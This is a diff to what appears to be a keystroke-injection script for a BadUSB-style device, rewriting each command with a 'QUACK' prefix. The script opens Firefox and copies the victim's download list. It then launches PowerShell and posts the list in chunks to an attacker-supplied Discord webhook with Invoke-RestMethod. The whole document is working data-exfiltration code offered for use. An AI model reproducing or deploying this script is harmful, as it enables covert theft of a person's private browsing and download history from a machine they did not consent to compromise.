@@ -14,66 +14,66 @@
 
 
 * Open Firefox
-GUI
-DELAY 1000
-STRING Firefox
-DELAY 500
-ENTER
-DELAY 2000
+QUACK GUI
+QUACK DELAY 1000
+QUACK STRING Firefox
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 2000
 
 * Goto downloads and copy all
-CTRL j
-DELAY 500
-CTRL a
-DELAY 500
-CTRL c
-DELAY 500
+QUACK CTRL j
+QUACK DELAY 500
+QUACK CTRL a
+QUACK DELAY 500
+QUACK CTRL c
+QUACK DELAY 500
 
 * Open a PowerShell and put all the links into $DOWNLOADS var
-GUI r
-DELAY 500
-STRING powershell
-ENTER
-DELAY 1000
-STRING $DOWNLOADS="
-CTRL v
-DELAY 500
-ENTER
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING $DOWNLOADS="
+QUACK CTRL v
+QUACK DELAY 500
+QUACK ENTER
 
 * It depends on the number of links
-DELAY 10000
+QUACK DELAY 10000
 
-STRING "
-ENTER
+QUACK STRING "
+QUACK ENTER
 
 * Exfiltration using Discord Webhook
 * You must define your Discord webhook if you want to use this method for the exfiltration
-STRING $WebhookUrl = "DISCORD_WEBHOOK"
-ENTER
+QUACK STRING $WebhookUrl = "DISCORD_WEBHOOK"
+QUACK ENTER
 
-STRING $Payload = @{content = $DOWNLOADS} | ConvertTo-Json
-ENTER
+QUACK STRING $Payload = @{content = $DOWNLOADS} | ConvertTo-Json
+QUACK ENTER
 
 * This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
-STRING $len = $DOWNLOADS.Length
-ENTER
-STRING $MAX_LEN = 1900
-ENTER
-STRING $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)
-ENTER
-STRING for ($i = 0; $i -lt $ITERATIONS; $i++) {
-ENTER
-STRING $init = $i * $MAX_LEN
-ENTER
-STRING $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
+QUACK STRING $len = $DOWNLOADS.Length
+QUACK ENTER
+QUACK STRING $MAX_LEN = 1900
+QUACK ENTER
+QUACK STRING $ITERATIONS = [math]::Ceiling($len / $MAX_LEN)
+QUACK ENTER
+QUACK STRING for ($i = 0; $i -lt $ITERATIONS; $i++) {
+QUACK ENTER
+QUACK STRING $init = $i * $MAX_LEN
+QUACK ENTER
+QUACK STRING $end = [math]::Min(($i + 1) * $MAX_LEN, $len)
         
-ENTER
-STRING $sub = $DOWNLOADS.Substring($init, $end - $init)
-ENTER
-STRING $Payload = @{content = $sub} | ConvertTo-Json
+QUACK ENTER
+QUACK STRING $sub = $DOWNLOADS.Substring($init, $end - $init)
+QUACK ENTER
+QUACK STRING $Payload = @{content = $sub} | ConvertTo-Json
 
-ENTER
-STRING Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
-ENTER
-STRING }; exit;
-ENTER
+QUACK ENTER
+QUACK STRING Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
+QUACK ENTER
+QUACK STRING }; exit;
+QUACK ENTER
